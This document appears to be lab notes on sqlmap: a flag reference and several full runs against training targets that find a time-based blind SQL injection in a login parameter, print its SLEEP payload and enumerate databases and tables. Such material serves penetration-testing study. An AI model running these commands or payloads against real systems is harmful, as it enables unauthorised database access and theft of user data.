sqlmap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications. It simplifies the process of identifying these vulnerabilities.

some flags:

```
-u = URL flag
--dbs = grab all available database
--tables = grab all available tables
--dump = grab all data inside table
--columns = grab all columns
--dump-all = dump everything sqlmap can
-D = database
-T = table
--help = help menu for sqlmap
```

```
#Example

user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:51:48] [INFO] resuming back-end DBMS' mysql' 
[08:51:48] [INFO] testing connection to the target URL
[08:51:49] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]
[08:51:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:51:49] [INFO] fetching columns for table 'thomas' in database 'users'
[08:51:49] [INFO] fetching entries for table 'thomas' in database' users'
[08:51:49] [INFO] recognized possible password hashes in column 'passhash'
do you want to store hashes to a temporary file for eventual further processing n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: users
Table: thomas
[1 entry]
+---------------------+------------+---------+
| Date                | name       | pass    |    
+---------------------+------------+----------
| 09/09/2024          | Thomas THM | testing |    
+---------------------+------------+---------+
```

However, unlike the URL used for testing above, you can also use POST-based testing, where the application sends data in the request's body instead of the URL. Examples of this could be login forms, registration forms, etc.

```
user@ubuntu:~$ sqlmap -r intercepted_request.txt     
```

```
ajdev@rootbox:~$ sqlmap -u 'http://10.48.183.217/ai/includes/user_login?email=test&password=test' --dbs
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.4#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:19:11 /2026-02-01/

[20:19:11] [INFO] testing connection to the target URL
[20:19:11] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:19:11] [INFO] testing if the target URL content is stable
[20:19:12] [INFO] target URL content is stable
[20:19:12] [INFO] testing if GET parameter 'email' is dynamic
[20:19:12] [INFO] GET parameter 'email' appears to be dynamic
[20:19:12] [WARNING] heuristic (basic) test shows that GET parameter 'email' might not be injectable
[20:19:12] [INFO] testing for SQL injection on GET parameter 'email'
[20:19:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:19:12] [WARNING] reflective value(s) found and filtering out
[20:19:16] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[20:19:16] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:19:17] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[20:19:18] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[20:19:18] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[20:19:19] [INFO] testing 'Generic inline queries'
[20:19:19] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[20:19:19] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[20:19:19] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[20:19:19] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[20:19:19] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:19:40] [INFO] GET parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[20:21:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:21:11] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:21:11] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[20:21:12] [INFO] target URL appears to have 4 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] n
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[20:21:42] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
[20:21:43] [INFO] target URL appears to be UNION injectable with 4 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[20:22:03] [INFO] checking if the injection point on GET parameter 'email' is a false positive
GET parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 147 HTTP(s) requests:
---
Parameter: email (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test' AND (SELECT 7268 FROM (SELECT(SLEEP(5)))SNZo) AND 'rOcg'='rOcg&password=test
---
[20:22:52] [INFO] the back-end DBMS is MySQL
[20:22:52] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
web application technology: Apache 2.4.53
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[20:23:02] [INFO] fetching database names
[20:23:02] [INFO] fetching number of databases
[20:23:02] [INFO] retrieved:

6
```

```
ajdev@rootbox:~$ sqlmap -u 'http://10.48.183.217/ai/includes/user_login?email=test&password=test' -D ai --tables
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:25:17 /2026-02-01/

[20:25:17] [INFO] resuming back-end DBMS 'mysql'
[20:25:17] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test' AND (SELECT 7268 FROM (SELECT(SLEEP(5)))SNZo) AND 'rOcg'='rOcg&password=test
---
[20:25:17] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.53
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[20:25:17] [INFO] fetching tables for database: 'ai'
[20:25:17] [INFO] fetching number of tables for database 'ai'
[20:25:17] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[20:25:19] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] n
1
[20:25:49] [INFO] retrieved: user
Database: ai
[1 table]
+------+
| user |
+------+

[20:27:52] [INFO] fetched data logged to text files under '/home/ajdev/.local/share/sqlmap/output/10.48.183.217'
[20:27:52] [WARNING] your sqlmap version is outdated

[*] ending @ 20:27:52 /2026-02-01/
```

```

```